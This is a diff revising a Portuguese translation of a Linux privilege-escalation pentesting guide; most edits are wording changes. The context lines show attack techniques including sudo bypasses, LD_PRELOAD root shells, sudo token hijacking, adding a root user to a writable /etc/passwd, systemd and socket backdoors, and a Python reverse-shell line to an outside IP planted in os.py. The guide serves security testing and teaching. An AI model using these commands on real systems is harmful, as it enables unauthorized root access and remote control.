@@ -6,7 +6,7 @@
 
 ### Informações do SO
 
-Vamos começar a adquirir algum conhecimento sobre o SO em execução
+Vamos começar a obter algumas informações sobre o SO em execução
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
@@ -73,7 +73,7 @@ De @sickrov
 ```
 sudo -u#-1 /bin/bash
 ```
-### Dmesg verificação de assinatura falhou
+### Dmesg assinatura de verificação falhou
 
 Verifique a **caixa smasher2 do HTB** para um **exemplo** de como essa vulnerabilidade pode ser explorada.
 ```bash
@@ -86,7 +86,7 @@ date 2>/dev/null #Date
 lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
-## Enumere as defesas possíveis
+## Enumerar possíveis defesas
 
 ### AppArmor
 ```bash
@@ -231,7 +231,7 @@ rm $1*.bin
 #### /dev/mem
 
 `/dev/mem` fornece acesso à **memória** física do sistema, não à memória virtual. O espaço de endereço virtual do kernel pode ser acessado usando /dev/kmem.\
-Normalmente, `/dev/mem` é apenas legível por **root** e o grupo **kmem**.
+Normalmente, `/dev/mem` é legível apenas por **root** e pelo grupo **kmem**.
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
@@ -419,7 +419,7 @@ Unit=backdoor.service
 ```
 Na documentação, você pode ler o que é a Unidade:
 
-> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não especificado, este valor padrão é um serviço que tem o mesmo nome que a unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unidade que é ativada e o nome da unidade do temporizador tenham nomes idênticos, exceto pelo sufixo.
+> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não especificado, este valor padrão é um serviço que tem o mesmo nome que a unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unidade que é ativada e o nome da unidade do temporizador sejam nomeados de forma idêntica, exceto pelo sufixo.
 
 Portanto, para abusar dessa permissão, você precisaria:
 
@@ -454,7 +454,7 @@ Os sockets podem ser configurados usando arquivos `.socket`.
 ### Arquivos .socket graváveis
 
 Se você encontrar um arquivo `.socket` **gravável**, pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e o backdoor será executado antes que o socket seja criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
-_Observe que o sistema deve estar usando essa configuração de arquivo socket ou o backdoor não será executado._
+_Observe que o sistema deve estar usando essa configuração de arquivo socket ou o backdoor não será executado_
 
 ### Sockets graváveis
 
@@ -481,7 +481,7 @@ socket-command-injection.md
 
 ### Sockets HTTP
 
-Observe que pode haver alguns **sockets ouvindo por requisições HTTP** (_não estou falando sobre arquivos .socket, mas os arquivos que atuam como sockets unix_). Você pode verificar isso com:
+Note que pode haver alguns **sockets ouvindo por requisições HTTP** (_não estou falando sobre arquivos .socket, mas os arquivos que atuam como sockets unix_). Você pode verificar isso com:
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -489,7 +489,7 @@ Se o socket **responder com uma requisição HTTP**, então você pode **comunic
 
 ### Socket Docker Gravável
 
-O socket Docker, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é gravável pelo usuário `root` e membros do grupo `docker`. Possuir acesso de gravação a este socket pode levar à escalada de privilégios. Aqui está uma análise de como isso pode ser feito e métodos alternativos caso o Docker CLI não esteja disponível.
+O socket Docker, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é gravável pelo usuário `root` e membros do grupo `docker`. Possuir acesso de gravação a este socket pode levar à escalada de privilégios. Aqui está uma análise de como isso pode ser feito e métodos alternativos se o Docker CLI não estiver disponível.
 
 #### **Escalada de Privilégios com Docker CLI**
 
@@ -536,7 +536,7 @@ Após configurar a conexão `socat`, você pode executar comandos diretamente no
 
 ### Outros
 
-Observe que se você tiver permissões de gravação sobre o socket do docker porque está **dentro do grupo `docker`** você tem [**mais maneiras de escalar privilégios**](interesting-groups-linux-pe/index.html#docker-group). Se a [**API do docker estiver ouvindo em uma porta** você também pode ser capaz de comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Observe que se você tiver permissões de gravação sobre o socket do docker porque está **dentro do grupo `docker`**, você tem [**mais maneiras de escalar privilégios**](interesting-groups-linux-pe/index.html#docker-group). Se a [**API do docker estiver escutando em uma porta**, você também pode ser capaz de comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
 Verifique **mais maneiras de sair do docker ou abusar dele para escalar privilégios** em:
 
@@ -653,7 +653,7 @@ gpg --list-keys 2>/dev/null
 ```
 ### Big UID
 
-Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT_MAX** escalem privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).\
+Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT_MAX** escalem privilégios. Mais informações: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [here](https://twitter.com/paragonsec/status/1071152249529884674).\
 **Exploit it** usando: **`systemd-run -t /bin/bash`**
 
 ### Groups
@@ -677,7 +677,7 @@ echo "Highlighted text: "`xsel -o 2>/dev/null`
 else echo "Not found xsel and xclip"
 fi
 ```
-### Política de Senhas
+### Política de Senha
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
@@ -769,7 +769,7 @@ Essa técnica também pode ser usada se um **suid** binário **executar outro co
 
 ### Binário SUID com caminho de comando
 
-Se o binário **suid** **executar outro comando especificando o caminho**, então, você pode tentar **exportar uma função** nomeada como o comando que o arquivo suid está chamando.
+Se o **suid** binário **executar outro comando especificando o caminho**, então, você pode tentar **exportar uma função** nomeada como o comando que o arquivo suid está chamando.
 
 Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_, você deve tentar criar a função e exportá-la:
 ```bash
@@ -809,12 +809,12 @@ Então **compile-o** usando:
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Finalmente, **escalar privilégios** executando
+Finalmente, **escalando privilégios** executando
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 > [!CAUTION]
-> Uma privesc semelhante pode ser abusada se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH** porque ele controla o caminho onde as bibliotecas serão procuradas.
+> Um privesc semelhante pode ser abusado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH** porque ele controla o caminho onde as bibliotecas serão procuradas.
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -892,7 +892,7 @@ isso significa que a biblioteca que você gerou precisa ter uma função chamada
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você pode **apenas injetar argumentos** em um comando.
+[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos onde você pode **apenas injetar argumentos** em um comando.
 
 O projeto coleta funções legítimas de binários Unix que podem ser abusadas para sair de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, gerar shells bind e reverse, e facilitar outras tarefas de pós-exploração.
 
@@ -911,16 +911,16 @@ https://gtfoargs.github.io/
 
 ### FallOfSudo
 
-Se você pode acessar `sudo -l`, pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se encontra uma maneira de explorar qualquer regra do sudo.
+Se você pode acessar `sudo -l`, pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se encontra uma forma de explorar qualquer regra do sudo.
 
-### Reutilizando Tokens do Sudo
+### Reutilizando Tokens Sudo
 
-Em casos onde você tem **acesso ao sudo** mas não a senha, você pode escalar privilégios **esperando pela execução de um comando sudo e então sequestrando o token da sessão**.
+Em casos onde você tem **acesso sudo** mas não a senha, você pode escalar privilégios **esperando pela execução de um comando sudo e então sequestrando o token da sessão**.
 
 Requisitos para escalar privilégios:
 
 - Você já tem um shell como usuário "_sampleuser_"
-- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token do sudo que nos permite usar `sudo` sem introduzir nenhuma senha)
+- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token sudo que nos permite usar `sudo` sem introduzir nenhuma senha)
 - `cat /proc/sys/kernel/yama/ptrace_scope` é 0
 - `gdb` é acessível (você pode ser capaz de carregá-lo)
 
@@ -928,7 +928,7 @@ Requisitos para escalar privilégios:
 
 Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
-- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token do sudo na sua sessão** (você não obterá automaticamente um shell root, faça `sudo su`):
+- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token sudo na sua sessão** (você não obterá automaticamente um shell root, faça `sudo su`):
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
@@ -1075,12 +1075,12 @@ setfacl -b file.txt #Remove the ACL of the file
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
-## Abrir sessões de shell
+## Open shell sessions
 
-Em **versões antigas**, você pode **sequestar** algumas sessões de **shell** de um usuário diferente (**root**).\
-Em **versões mais recentes**, você poderá **conectar-se** apenas às sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.
+Em **versões antigas** você pode **sequestrar** algumas sessões de **shell** de um usuário diferente (**root**).\
+Em **versões mais recentes** você poderá **conectar-se** apenas às sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.
 
-### sequestro de sessões de tela
+### screen sessions hijacking
 
 **Listar sessões de tela**
 ```bash
@@ -1192,7 +1192,7 @@ Em algumas ocasiões, você pode encontrar **password hashes** dentro do arquivo
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
-### Gravável /etc/passwd
+### Writable /etc/passwd
 
 Primeiro, gere uma senha com um dos seguintes comandos.
 ```
@@ -1200,13 +1200,13 @@ openssl passwd -1 -salt hacker hacker
 mkpasswd -m SHA-512 hacker
 python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
 ```
-Então adicione o usuário `hacker` e adicione a senha gerada.
+Em seguida, adicione o usuário `hacker` e adicione a senha gerada.
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
-E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+Exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
-Você pode agora usar o comando `su` com `hacker:hacker`
+Agora você pode usar o comando `su` com `hacker:hacker`
 
 Alternativamente, você pode usar as seguintes linhas para adicionar um usuário fictício sem senha.\
 AVISO: você pode degradar a segurança atual da máquina.
@@ -1216,12 +1216,12 @@ su - dummy
 ```
 NOTA: Em plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, além disso, o `/etc/shadow` é renomeado para `/etc/spwd.db`.
 
-Você deve verificar se pode **escrever em alguns arquivos sensíveis**. Por exemplo, você pode escrever em algum **arquivo de configuração de serviço**?
+Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, você pode escrever em algum **arquivo de configuração de serviço**?
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Por exemplo, se a máquina estiver executando um **servidor tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então você pode modificar as linhas:
+Por exemplo, se a máquina estiver executando um **tomcat** server e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então você pode modificar as linhas:
 ```
 ExecStart=/path/to/backdoor
 User=root
@@ -1235,7 +1235,7 @@ As seguintes pastas podem conter backups ou informações interessantes: **/tmp*
 ```bash
 ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
-### Arquivos em Localização Estranha/Propriedade
+### Arquivos em Localizações Estranhas/Propriedade
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1268,7 +1268,7 @@ find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -nam
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
-### **Script/Binaries no PATH**
+### **Script/Binários no PATH**
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
@@ -1292,7 +1292,7 @@ Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalat
 ### Logs
 
 Se você puder ler logs, pode ser capaz de encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho o log, mais interessante ele será (provavelmente).\
-Além disso, alguns **logs de auditoria** configurados de forma "**ruim**" (com backdoor?) podem permitir que você **registre senhas** dentro dos logs de auditoria, conforme explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+Além disso, alguns **logs de auditoria** "**mal**" configurados (com backdoor?) podem permitir que você **registre senhas** dentro dos logs de auditoria, conforme explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
@@ -1310,26 +1310,26 @@ Para **ler logs o grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-g
 ~/.zlogin #zsh shell
 ~/.zshrc #zsh shell
 ```
-### Generic Creds Search/Regex
+### Pesquisa/Regex de Credenciais Genéricas
 
 Você também deve verificar arquivos que contêm a palavra "**password**" em seu **nome** ou dentro do **conteúdo**, e também verificar IPs e emails dentro de logs, ou expressões regulares de hashes.\
 Não vou listar aqui como fazer tudo isso, mas se você estiver interessado, pode verificar as últimas verificações que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.
 
-## Writable files
+## Arquivos Graváveis
 
-### Python library hijacking
+### Sequestro de Biblioteca Python
 
-Se você souber **de onde** um script python será executado e **puder escrever dentro** daquela pasta ou **modificar bibliotecas python**, você pode modificar a biblioteca OS e backdoor ela (se você puder escrever onde o script python será executado, copie e cole a biblioteca os.py).
+Se você souber **de onde** um script python será executado e **puder escrever dentro** daquela pasta ou **modificar bibliotecas python**, você pode modificar a biblioteca OS e criar um backdoor (se você puder escrever onde o script python será executado, copie e cole a biblioteca os.py).
 
-Para **backdoor a biblioteca**, basta adicionar ao final da biblioteca os.py a seguinte linha (mude IP e PORT):
+Para **criar um backdoor na biblioteca**, basta adicionar ao final da biblioteca os.py a seguinte linha (mude IP e PORT):
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
-### Exploração do logrotate
+### Exploração do Logrotate
 
 Uma vulnerabilidade no `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai potencialmente ganhem privilégios elevados. Isso ocorre porque o `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar as permissões não apenas em _/var/log_, mas também em qualquer diretório onde a rotação de logs é aplicada.
 
-> [!NOTE]
+> [!TIP]
 > Esta vulnerabilidade afeta a versão `3.18.0` do `logrotate` e versões anteriores.
 
 Informações mais detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
@@ -1342,7 +1342,7 @@ Esta vulnerabilidade é muito semelhante a [**CVE-2016-1247**](https://www.cvede
 
 **Referência de vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<qualquer>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está comprometido**.
+Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está comprometido**.
 
 Scripts de rede, _ifcg-eth0_ por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).
 
@@ -1400,7 +1400,7 @@ cisco-vmanage.md
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumera vulnerabilidades do kernel no linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Enumere vulnerabilidades do kernel no linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local_exploit_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (acesso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
